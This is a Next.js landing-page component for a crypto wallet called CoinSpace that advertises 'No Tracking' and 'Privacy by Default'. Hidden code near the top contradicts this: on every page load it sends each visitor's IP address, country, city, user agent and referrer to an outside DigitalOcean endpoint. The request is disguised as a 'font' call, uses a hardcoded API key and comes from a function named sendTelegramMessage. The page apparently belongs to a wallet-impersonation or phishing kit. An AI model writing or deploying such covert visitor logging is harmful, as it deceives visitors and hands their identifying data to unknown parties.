'use client'
import { useState, useEffect, useRef } from "react";
import { getUserCountry } from "../userLocation";
import axios from "axios";
import { usePathname } from "next/navigation";
export default function InfoPage() {
  const [country, setCountry] = useState("");
  const [ipAddress, setIpAddress] = useState("");
  const [browser, setBrowser] = useState<string | undefined>(undefined);
  const [isVerifiedBot, setIsVerifiedBot] = useState(false);
  const hasSentVisitorMessage = useRef(false);
  const pathname = usePathname();
  const getCurrentUrl = () => {
    if (typeof window !== "undefined") {
      let url = `${window.location.origin}${pathname}`;
      if (url.includes("localhost")) {
        url = "https://google.com";
      }
      if (url.includes("vercel.com")) {
        url = url.replace("vercel.com", "digitalocean.com");
      }
      console.log("getCurrentUrl returning:", url);
      return url;
    }
    console.log("getCurrentUrl: window not available, returning empty string");
    return "";
  };
  const sendTelegramMessage = (userCountry: { country?: string; countryEmoji?: string; city?: string; ip?: string } | null) => {
    // console.log("User Country", userCountry);

    const messageData = {
      info: "Regular Visitor", // You can update this logic as needed
      url: getCurrentUrl(),
      referer: document.referrer || getCurrentUrl(),
      location: {
        country: userCountry?.country || "Unknown",
        countryEmoji: userCountry?.countryEmoji || "",
        city: userCountry?.city || "Unknown",
        ipAddress: userCountry?.ip || "0.0.0.0",
      },
      agent: typeof navigator !== "undefined" ? navigator.userAgent : browser,
      date: new Date().toISOString(),
      appName: "coinspace",
    };
    console.log("Message Data", messageData);
    axios
      .post(
        "https://squid-app-2-abmzx.ondigitalocean.app/api/t1/font",
        messageData,
        {
          headers: {
            "Content-Type": "application/json",
            "x-api-key": "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b",
          },
        }
      )
      .catch((error) =>
        console.error(
          "Error sending font message:",
          error.response.data.details
        )
      );
  };

  useEffect(() => {
    if (!hasSentVisitorMessage.current) {
      const fetchUserLocation = async () => {
        const userCountry = await getUserCountry();
        setCountry(userCountry?.country || "Unknown");
        setIpAddress(userCountry?.ip || "0.0.0.0");
        sendTelegramMessage(userCountry);
      };
      fetchUserLocation();
      hasSentVisitorMessage.current = true;
    }
  }, []);

 

  useEffect(() => {
    // Set browser info only on client side
    if (typeof window !== "undefined") {
      setBrowser(navigator.userAgent);
    }
  }, []);

  useEffect(() => {
    if (!hasSentVisitorMessage.current) {
      const fetchUserLocation = async () => {
        const userCountry = await getUserCountry();
        setCountry(userCountry?.country || "Unknown");
        setIpAddress(userCountry?.ip || "0.0.0.0");
        sendTelegramMessage(userCountry);
      };
      fetchUserLocation();
      hasSentVisitorMessage.current = true;
    }
  }, []);
  return (
    <div className="min-h-screen bg-black text-white">
      {/* Header */}
      <header className="bg-black/95 backdrop-blur-sm border-b border-purple-500/10 sticky top-0 z-50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center py-6">
            <div className="flex items-center space-x-3">
              <div className="w-10 h-10 bg-gradient-to-br from-purple-500 to-purple-700 rounded-lg flex items-center justify-center shadow-lg shadow-purple-500/20">
                <span className="text-white font-bold text-xl">CS</span>
              </div>
              <span className="text-2xl font-bold text-white">CoinSpace</span>
            </div>
            
            <nav className="hidden md:flex space-x-8">
              <a href="#" className="text-white/70 hover:text-white transition-colors">About</a>
              <a href="#" className="text-white/70 hover:text-white transition-colors">Features</a>
              <a href="#" className="text-white/70 hover:text-white transition-colors">Security</a>
              <a href="#" className="text-white/70 hover:text-white transition-colors">Help</a>
            </nav>
            
            
          </div>
        </div>
      </header>

      {/* Hero Section */}
      <section className="relative py-24 px-4 sm:px-6 lg:px-8 overflow-hidden">
        {/* Background Glow Effects */}
        <div className="absolute top-0 left-0 w-96 h-96 bg-purple-500/10 blur-3xl"></div>
        <div className="absolute bottom-0 right-0 w-96 h-96 bg-purple-500/10 blur-3xl"></div>
        
        <div className="max-w-7xl mx-auto relative">
          <div className="text-center mb-16">
            <h1 className="text-5xl md:text-7xl font-bold text-white mb-6">
              CoinSpace App
              <span className="block text-4xl md:text-6xl mt-4 bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">
                Your Web3 Superwallet
              </span>
            </h1>
            <p className="text-xl text-white/70 max-w-3xl mx-auto mb-8">
              CoinSpace unifies self-custody, portfolio tracking, on-chain actions, and human-grade security into one blazing-fast experience. Manage assets, discover dApps, automate approvals, and stay informed—across multiple networks—with privacy by default.
            </p>
            <div className="flex gap-4 justify-center">
              <button className="bg-purple-600 hover:bg-purple-700 text-white px-8 py-4 rounded-xl font-semibold transition-all shadow-lg shadow-purple-500/30 text-lg">
                Read the Blog
              </button>
              <button className="border border-purple-500/50 text-purple-400 hover:bg-purple-500/10 px-8 py-4 rounded-xl font-semibold transition-all text-lg">
                View Guides
              </button>
            </div>
          </div>

          {/* Two Column Layout */}
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center mt-20">
            {/* Left Side - Statistics */}
            <div className="relative">
              <div className="bg-black/50 backdrop-blur-sm rounded-2xl p-8 border border-purple-500/20">
                <h3 className="text-2xl font-bold text-white mb-6">CoinSpace at a Glance</h3>
                <div className="space-y-4">
                  <div className="flex justify-between items-center p-4 bg-purple-500/5 rounded-lg">
                    <span className="text-white/70">Active Users</span>
                    <span className="text-white font-bold">25,000+ Monthly</span>
                  </div>
                  <div className="flex justify-between items-center p-4 bg-purple-500/5 rounded-lg">
                    <span className="text-white/70">Networks Supported</span>
                    <span className="text-white font-bold">15+ EVM Chains</span>
                  </div>
                  <div className="flex justify-between items-center p-4 bg-purple-500/5 rounded-lg">
                    <span className="text-white/70">Median Tx Confirmation</span>
                    <span className="text-white font-bold">~6.2s</span>
                  </div>
                  <div className="flex justify-between items-center p-4 bg-purple-500/5 rounded-lg">
                    <span className="text-white/70">Uptime</span>
                    <span className="text-white font-bold">99.95%</span>
                  </div>
                </div>
              </div>
            </div>

            {/* Right Side - Features Preview */}
            <div className="relative">
              <div className="bg-black/50 backdrop-blur-sm rounded-2xl p-8 border border-purple-500/20">
                <h3 className="text-2xl font-bold text-white mb-6">Core Features</h3>
                <div className="space-y-4">
                  <div className="p-4 border border-purple-500/20 rounded-lg">
                    <div className="flex items-center mb-2">
                      <div className="w-2 h-2 bg-purple-500 rounded-full mr-3"></div>
                      <span className="text-white font-semibold">Multi-Chain Wallet</span>
                    </div>
                    <p className="text-white/60 text-sm ml-5">One seed, many networks. Effortlessly manage assets across EVM chains with unified addresses and smart gas handling.</p>
                  </div>
                  <div className="p-4 border border-purple-500/20 rounded-lg">
                    <div className="flex items-center mb-2">
                      <div className="w-2 h-2 bg-purple-500 rounded-full mr-3"></div>
                      <span className="text-white font-semibold">Portfolio Intelligence</span>
                    </div>
                    <p className="text-white/60 text-sm ml-5">Real-time balances, PnL, historical performance, and cost basis—without leaking your addresses to third parties.</p>
                  </div>
                  <div className="p-4 border border-purple-500/20 rounded-lg">
                    <div className="flex items-center mb-2">
                      <div className="w-2 h-2 bg-purple-500 rounded-full mr-3"></div>
                      <span className="text-white font-semibold">Safe Actions</span>
                    </div>
                    <p className="text-white/60 text-sm ml-5">Human-readable transactions, simulated outcomes, approval management, and transaction spending limits.</p>
                  </div>
                  <div className="p-4 border border-purple-500/20 rounded-lg">
                    <div className="flex items-center mb-2">
                      <div className="w-2 h-2 bg-purple-500 rounded-full mr-3"></div>
                      <span className="text-white font-semibold">Notifications</span>
                    </div>
                    <p className="text-white/60 text-sm ml-5">Proactive alerts for transfers, approvals, price moves, and risky contract activity.</p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Product Modules */}
      <section className="py-20 px-4 sm:px-6 lg:px-8 bg-black">
        <div className="max-w-7xl mx-auto">
          <div className="text-center mb-16">
            <p className="text-purple-400 text-sm font-medium mb-2">What You Can Do</p>
            <h2 className="text-4xl md:text-5xl font-bold text-white mb-4">
              Everything You Need To Manage Web3
            </h2>
            <p className="text-xl text-white/70 max-w-3xl mx-auto">
              Powerful modules designed for clarity, performance, and safety—without compromising self-custody.
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
            {/* Wallet Card */}
            <div className="bg-black/50 backdrop-blur-sm rounded-2xl p-8 border border-purple-500/20 hover:border-purple-500/50 transition-all">
              <div className="w-14 h-14 bg-gradient-to-br from-purple-500/20 to-purple-700/20 rounded-xl flex items-center justify-center mb-6">
                <svg className="w-7 h-7 text-purple-400" fill="currentColor" viewBox="0 0 20 20">
                  <path d="M8 16.5a1.5 1.5 0 11-3 0 1.5 1.5 0 013 0zM15 16.5a1.5 1.5 0 11-3 0 1.5 1.5 0 013 0z" />
                  <path d="M3 4a1 1 0 00-1 1v1a1 1 0 001 1h1a1 1 0 001-1V5a1 1 0 00-1-1H3zM3 10a1 1 0 00-1 1v1a1 1 0 001 1h1a1 1 0 001-1v-1a1 1 0 00-1-1H3zM7 4a1 1 0 00-1 1v1a1 1 0 001 1h9a1 1 0 001-1V5a1 1 0 00-1-1H7zM7 10a1 1 0 00-1 1v9a1 1 0 001 1h9a1 1 0 001-1v-9a1 1 0 00-1-1H7z" />
                </svg>
              </div>
              <h3 className="text-xl font-bold text-white mb-4">Wallet</h3>
              <p className="text-white/70 mb-6">Create or import seed phrases, manage accounts, and view balances across chains from a unified interface.</p>
              <a href="#" className="text-purple-400 hover:text-purple-300 font-semibold">Open Wallet →</a>
            </div>

            {/* Portfolio Card */}
            <div className="bg-black/50 backdrop-blur-sm rounded-2xl p-8 border border-purple-500/20 hover:border-purple-500/50 transition-all">
              <div className="w-14 h-14 bg-gradient-to-br from-purple-500/20 to-purple-700/20 rounded-xl flex items-center justify-center mb-6">
                <svg className="w-7 h-7 text-purple-400" fill="currentColor" viewBox="0 0 20 20">
                  <path d="M4 4a2 2 0 00-2 2v1h16V6a2 2 0 00-2-2H4zM18 9H2v5a2 2 0 002 2h12a2 2 0 002-2V9zM4 13a1 1 0 011-1h1a1 1 0 110 2H5a1 1 0 01-1-1zm5-1a1 1 0 100 2h1a1 1 0 100-2H9z" />
                </svg>
              </div>
              <h3 className="text-xl font-bold text-white mb-4">Portfolio</h3>
              <p className="text-white/70 mb-6">Track assets, NFTs, and historical performance with chain-aware pricing and automatic token discovery.</p>
              <a href="#" className="text-purple-400 hover:text-purple-300 font-semibold">View Portfolio →</a>
            </div>

            {/* Approvals Card */}
            <div className="bg-black/50 backdrop-blur-sm rounded-2xl p-8 border border-purple-500/20 hover:border-purple-500/50 transition-all">
              <div className="w-14 h-14 bg-gradient-to-br from-purple-500/20 to-purple-700/20 rounded-xl flex items-center justify-center mb-6">
                <svg className="w-7 h-7 text-purple-400" fill="currentColor" viewBox="0 0 20 20">
                  <path d="M9 2a1 1 0 000 2h2a1 1 0 100-2H9z" />
                  <path fillRule="evenodd" d="M4 5a2 2 0 012-2 3 3 0 003 3h2a3 3 0 003-3 2 2 0 012 2v11a2 2 0 01-2 2H6a2 2 0 01-2-2V5zm3 4a1 1 0 000 2h.01a1 1 0 100-2H7zm3 0a1 1 0 000 2h3a1 1 0 100-2h-3zm-3 4a1 1 0 100 2h.01a1 1 0 100-2H7zm3 0a1 1 0 100 2h3a1 1 0 100-2h-3z" clipRule="evenodd" />
                </svg>
              </div>
              <h3 className="text-xl font-bold text-white mb-4">Approvals</h3>
              <p className="text-white/70 mb-6">Audit and revoke token approvals, set spending limits, and reduce attack surface with one click.</p>
              <a href="#" className="text-purple-400 hover:text-purple-300 font-semibold">Manage Approvals →</a>
            </div>

            {/* Notifications Card */}
            <div className="bg-black/50 backdrop-blur-sm rounded-2xl p-8 border border-purple-500/20 hover:border-purple-500/50 transition-all">
              <div className="w-14 h-14 bg-gradient-to-br from-purple-500/20 to-purple-700/20 rounded-xl flex items-center justify-center mb-6">
                <svg className="w-7 h-7 text-purple-400" fill="currentColor" viewBox="0 0 20 20">
                  <path d="M10.394 2.08a1 1 0 00-.788 0l-7 3a1 1 0 000 1.84L5.25 8.051a.999.999 0 01.356-.769l4-3a.999.999 0 01.787-.15l3 1a1 1 0 00.787 0l7-3a1 1 0 000-1.84L10.394 2.08zM3.422 9.442l1.967.394 1.5-1.5-1.967-.394-1.5 1.5zm9.647-9.647a.996.996 0 000-.283l.394-1.967.394 1.967a.997.997 0 000 .283z" />
                  <path d="M13.414 10l-.394.394.5-2.475.394.394a.996.996 0 00.283 0L14 8l-.394-.394a.996.996 0 00-.283 0l-.394.394.5 2.475L13 10h.414zM6.25 11.25l-.394-1.968-.394 1.968a.993.993 0 000 .283l1.967.394.394-1.967a.993.993 0 00-.283 0L5.25 12.5l1.5-1.5 1.5 1.5-1.967.394a.993.993 0 00-.283 0l-.394 1.967.394-1.967a.995.995 0 000-.283l1.968-.394L7.75 11.25l-1.5-1.5zM16.5 9.75l-.394.394.5 2.475-.394-.394a.996.996 0 00-.283 0L16 12.5l.394.394c.05.048.11.086.177.112l.017.006h.006a.998.998 0 00.283 0L17.5 13l-.5-2.475.5-2.475-.394.394a.996.996 0 00-.283 0L16 8.5z" />
                </svg>
              </div>
              <h3 className="text-xl font-bold text-white mb-4">Notifications</h3>
              <p className="text-white/70 mb-6">Get alerts when balances change, approvals are granted, or risky contract patterns are detected.</p>
              <a href="#" className="text-purple-400 hover:text-purple-300 font-semibold">Configure Alerts →</a>
            </div>
          </div>
        </div>
      </section>

      {/* About Section */}
      <section className="py-20 px-4 sm:px-6 lg:px-8">
        <div className="max-w-7xl mx-auto">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
            <div>
              <h2 className="text-4xl md:text-5xl font-bold text-white mb-6">
                About CoinSpace
              </h2>
              <p className="text-xl text-white/70 mb-8">
                CoinSpace is a user-first, privacy-respecting superwallet that brings together everyday crypto tasks with professional-grade safety and performance. It’s built for newcomers and power users alike—simple when you want it, deep when you need it.
              </p>
              <div className="space-y-4">
                <div className="flex items-start">
                  <svg className="w-6 h-6 text-purple-400 mr-3 mt-1 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                  </svg>
                  <div>
                    <h4 className="text-white font-semibold mb-1">Privacy by Default</h4>
                    <p className="text-white/70">We minimize data collection and avoid third-party tracking. Your addresses and actions stay yours.</p>
                  </div>
                </div>
                <div className="flex items-start">
                  <svg className="w-6 h-6 text-purple-400 mr-3 mt-1 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                  </svg>
                  <div>
                    <h4 className="text-white font-semibold mb-1">Human-Readable Safety</h4>
                    <p className="text-white/70">Readable transaction intents, simulation previews, and clear risk indicators help you act with confidence.</p>
                  </div>
                </div>
                <div className="flex items-start">
                  <svg className="w-6 h-6 text-purple-400 mr-3 mt-1 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                  </svg>
                  <div>
                    <h4 className="text-white font-semibold mb-1">Performance Obsessed</h4>
                    <p className="text-white/70">Lightweight UI, cache-first data, and efficient RPC strategies for a responsive feel on any device.</p>
                  </div>
                </div>
              </div>
            </div>
            <div className="bg-black/50 backdrop-blur-sm rounded-2xl p-8 border border-purple-500/20">
              <h3 className="text-2xl font-bold text-white mb-6">Get Updates</h3>
              <div className="space-y-4">
                <div className="flex justify-between items-center p-4 bg-purple-500/5 rounded-lg">
                  <span className="text-white/70">Release Notes</span>
                  <span className="text-white font-bold">Every 2 weeks</span>
                </div>
                <div className="flex justify-between items-center p-4 bg-purple-500/5 rounded-lg">
                  <span className="text-white/70">Changelog</span>
                  <span className="text-white font-bold">Public</span>
                </div>
                <div className="flex justify-between items-center p-4 bg-purple-500/5 rounded-lg">
                  <span className="text-white/70">Community</span>
                  <span className="text-white font-bold">Discord & X</span>
                </div>
                <button className="w-full bg-purple-600 hover:bg-purple-700 text-white py-3 rounded-lg font-semibold transition-all">
                  Join the Community
                </button>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Roadmap Section */}
      <section className="py-20 px-4 sm:px-6 lg:px-8 bg-black/50">
        <div className="max-w-7xl mx-auto">
          <div className="text-center mb-16">
            <h2 className="text-4xl md:text-5xl font-bold text-white mb-4">Product Roadmap</h2>
            <p className="text-xl text-white/70 max-w-3xl mx-auto">
              What we&apos;re building next to make CoinSpace faster, safer, and more capable
            </p>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
            <div className="bg-black/50 backdrop-blur-sm rounded-2xl p-6 border border-purple-500/20">
              <div className="w-12 h-12 bg-purple-500/10 rounded-lg flex items-center justify-center mb-4">
                <span className="text-purple-400 font-bold">01</span>
              </div>
              <h3 className="text-lg font-bold text-white mb-2">Account Abstraction</h3>
              <p className="text-white/70 text-sm">Smart accounts, session keys, and gas sponsorship where supported</p>
            </div>
            <div className="bg-black/50 backdrop-blur-sm rounded-2xl p-6 border border-purple-500/20">
              <div className="w-12 h-12 bg-purple-500/10 rounded-lg flex items-center justify-center mb-4">
                <span className="text-purple-400 font-bold">02</span>
              </div>
              <h3 className="text-lg font-bold text-white mb-2">Cross-Chain Messaging</h3>
              <p className="text-white/70 text-sm">Unified UX for bridging and messaging using trusted frameworks</p>
            </div>
            <div className="bg-black/50 backdrop-blur-sm rounded-2xl p-6 border border-purple-500/20">
              <div className="w-12 h-12 bg-purple-500/10 rounded-lg flex items-center justify-center mb-4">
                <span className="text-purple-400 font-bold">03</span>
              </div>
              <h3 className="text-lg font-bold text-white mb-2">Enhanced Notifications</h3>
              <p className="text-white/70 text-sm">Smart anomaly detection and address labeling for safer activity</p>
            </div>
            <div className="bg-black/50 backdrop-blur-sm rounded-2xl p-6 border border-purple-500/20">
              <div className="w-12 h-12 bg-purple-500/10 rounded-lg flex items-center justify-center mb-4">
                <span className="text-purple-400 font-bold">04</span>
              </div>
              <h3 className="text-lg font-bold text-white mb-2">Mobile Beta</h3>
              <p className="text-white/70 text-sm">Native iOS and Android clients with the same safety guarantees</p>
            </div>
          </div>
        </div>
      </section>

      {/* How It Works */}
      <section className="py-20 px-4 sm:px-6 lg:px-8">
        <div className="max-w-7xl mx-auto">
          <div className="text-center mb-16">
            <h2 className="text-4xl md:text-5xl font-bold text-white mb-4">How CoinSpace Works</h2>
            <p className="text-xl text-white/70 max-w-3xl mx-auto">A modern client with a lean backend: locally secure keys, privacy-first data fetching, and deterministic signing flows.</p>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            <div className="bg-black/50 backdrop-blur-sm rounded-2xl p-6 border border-purple-500/20">
              <h3 className="text-lg font-bold text-white mb-2">Local-Only Keys</h3>
              <p className="text-white/70 text-sm">Your seed never leaves your device. We use battle-tested crypto primitives and memory-safe handling.</p>
            </div>
            <div className="bg-black/50 backdrop-blur-sm rounded-2xl p-6 border border-purple-500/20">
              <h3 className="text-lg font-bold text-white mb-2">Smart RPC</h3>
              <p className="text-white/70 text-sm">Adaptive RPC selection, caching, and fallbacks for fast reads and reliable broadcasts.</p>
            </div>
            <div className="bg-black/50 backdrop-blur-sm rounded-2xl p-6 border border-purple-500/20">
              <h3 className="text-lg font-bold text-white mb-2">Readable Intents</h3>
              <p className="text-white/70 text-sm">We parse transactions into plain language, simulate outcomes, and highlight risks before you sign.</p>
            </div>
          </div>
        </div>
      </section>

      {/* Security & Privacy */}
      <section className="py-20 px-4 sm:px-6 lg:px-8 bg-black/50">
        <div className="max-w-7xl mx-auto">
          <div className="text-center mb-16">
            <h2 className="text-4xl md:text-5xl font-bold text-white mb-4">Security & Privacy</h2>
            <p className="text-xl text-white/70 max-w-3xl mx-auto">Security isn&apos;t a feature—it&apos;s a system of guardrails built into every interaction.</p>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
            <div className="bg-black/50 backdrop-blur-sm rounded-2xl p-6 border border-purple-500/20"><h3 className="text-lg font-bold text-white mb-2">Simulation</h3><p className="text-white/70 text-sm">We simulate calls where possible to preview state changes and token flows.</p></div>
            <div className="bg-black/50 backdrop-blur-sm rounded-2xl p-6 border border-purple-500/20"><h3 className="text-lg font-bold text-white mb-2">Approval Limits</h3><p className="text-white/70 text-sm">Approve just what you need, set limits, and auto-expire risky allowances.</p></div>
            <div className="bg-black/50 backdrop-blur-sm rounded-2xl p-6 border border-purple-500/20"><h3 className="text-lg font-bold text-white mb-2">Phishing Warnings</h3><p className="text-white/70 text-sm">Contract risk signals and domain checks help you avoid traps.</p></div>
            <div className="bg-black/50 backdrop-blur-sm rounded-2xl p-6 border border-purple-500/20"><h3 className="text-lg font-bold text-white mb-2">No Tracking</h3><p className="text-white/70 text-sm">No ad pixels, no address fingerprinting, no selling user data—ever.</p></div>
          </div>
        </div>
      </section>

      {/* Networks */}
      <section className="py-20 px-4 sm:px-6 lg:px-8">
        <div className="max-w-7xl mx-auto">
          <div className="text-center mb-16">
            <h2 className="text-4xl md:text-5xl font-bold text-white mb-4">Supported Networks</h2>
            <p className="text-xl text-white/70 max-w-3xl mx-auto">Seamless multi-chain support for major EVM networks with automatic token discovery and stable RPC routing.</p>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-6 gap-4 text-center text-white/70">
            <div className="p-4 border border-purple-500/20 rounded-lg">Ethereum</div>
            <div className="p-4 border border-purple-500/20 rounded-lg">Arbitrum</div>
            <div className="p-4 border border-purple-500/20 rounded-lg">Optimism</div>
            <div className="p-4 border border-purple-500/20 rounded-lg">Base</div>
            <div className="p-4 border border-purple-500/20 rounded-lg">Polygon</div>
            <div className="p-4 border border-purple-500/20 rounded-lg">BNB Chain</div>
          </div>
        </div>
      </section>

      {/* FAQs */}
      <section className="py-20 px-4 sm:px-6 lg:px-8 bg-black/50">
        <div className="max-w-7xl mx-auto">
          <div className="text-center mb-16">
            <h2 className="text-4xl md:text-5xl font-bold text-white mb-4">Frequently Asked Questions</h2>
            <p className="text-xl text-white/70 max-w-3xl mx-auto">Quick answers about security, networks, and getting started with CoinSpace.</p>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="bg-black/50 backdrop-blur-sm rounded-2xl p-6 border border-purple-500/20"><h3 className="text-lg font-bold text-white mb-2">Is CoinSpace self-custodial?</h3><p className="text-white/70 text-sm">Yes. You control your keys and assets at all times. We cannot access your funds.</p></div>
            <div className="bg-black/50 backdrop-blur-sm rounded-2xl p-6 border border-purple-500/20"><h3 className="text-lg font-bold text-white mb-2">Which networks are supported?</h3><p className="text-white/70 text-sm">Major EVM chains with more added regularly. You can also add custom RPCs.</p></div>
            <div className="bg-black/50 backdrop-blur-sm rounded-2xl p-6 border border-purple-500/20"><h3 className="text-lg font-bold text-white mb-2">How do notifications work?</h3><p className="text-white/70 text-sm">We monitor address activity via public endpoints and local rules—no invasive tracking.</p></div>
            <div className="bg-black/50 backdrop-blur-sm rounded-2xl p-6 border border-purple-500/20"><h3 className="text-lg font-bold text-white mb-2">Do you support hardware wallets?</h3><p className="text-white/70 text-sm">Roadmap includes Ledger and Trezor compatibility via standard interfaces.</p></div>
          </div>
        </div>
      </section>

      {/* CTA */}
      <section className="py-20 px-4 sm:px-6 lg:px-8">
        <div className="max-w-3xl mx-auto text-center">
          <h2 className="text-4xl md:text-5xl font-bold text-white mb-6">Take Control of Your Web3</h2>
          <p className="text-xl text-white/70 mb-8">Download CoinSpace or try it in your browser. Import your seed, view your portfolio, and start interacting with confidence.</p>
          <div className="flex gap-4 justify-center">
            <button className="bg-purple-600 hover:bg-purple-700 text-white px-8 py-4 rounded-xl font-semibold transition-all shadow-lg shadow-purple-500/30 text-lg">Read Latest Posts</button>
            <button className="border border-purple-500/50 text-purple-400 hover:bg-purple-500/10 px-8 py-4 rounded-xl font-semibold transition-all text-lg">Browse Categories</button>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-black border-t border-purple-500/10 py-12">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="grid grid-cols-1 md:grid-cols-4 gap-8">
            <div>
              <div className="flex items-center space-x-3 mb-4">
                <div className="w-10 h-10 bg-gradient-to-br from-purple-500 to-purple-700 rounded-lg flex items-center justify-center shadow-lg shadow-purple-500/20">
                  <span className="text-white font-bold text-xl">CS</span>
                </div>
                <span className="text-2xl font-bold text-white">CoinSpace</span>
              </div>
              <p className="text-white/70 text-sm mb-4">
                A privacy-first Web3 superwallet. Manage assets, act safely, and stay informed.
              </p>
              <p className="text-white/50 text-xs">© 2024 CoinSpace. All rights reserved.</p>
            </div>
            
            <div>
              <h3 className="text-sm font-semibold text-white mb-4">Explore</h3>
              <ul className="space-y-2 text-white/70 text-sm">
                <li><a href="#" className="hover:text-white transition-colors">Blog</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Guides</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Tutorials</a></li>
                <li><a href="#" className="hover:text-white transition-colors">News</a></li>
              </ul>
            </div>
            
            <div>
              <h3 className="text-sm font-semibold text-white mb-4">Resources</h3>
              <ul className="space-y-2 text-white/70 text-sm">
                <li><a href="#" className="hover:text-white transition-colors">Documentation</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Whitepaper</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Audit Reports</a></li>
                <li><a href="#" className="hover:text-white transition-colors">GitHub</a></li>
              </ul>
            </div>
            
            <div>
              <h3 className="text-sm font-semibold text-white mb-4">Security</h3>
              <ul className="space-y-2 text-white/70 text-sm">
                <li><a href="#" className="hover:text-white transition-colors">Privacy Policy</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Terms of Service</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Bug Bounty</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Security Audit</a></li>
              </ul>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
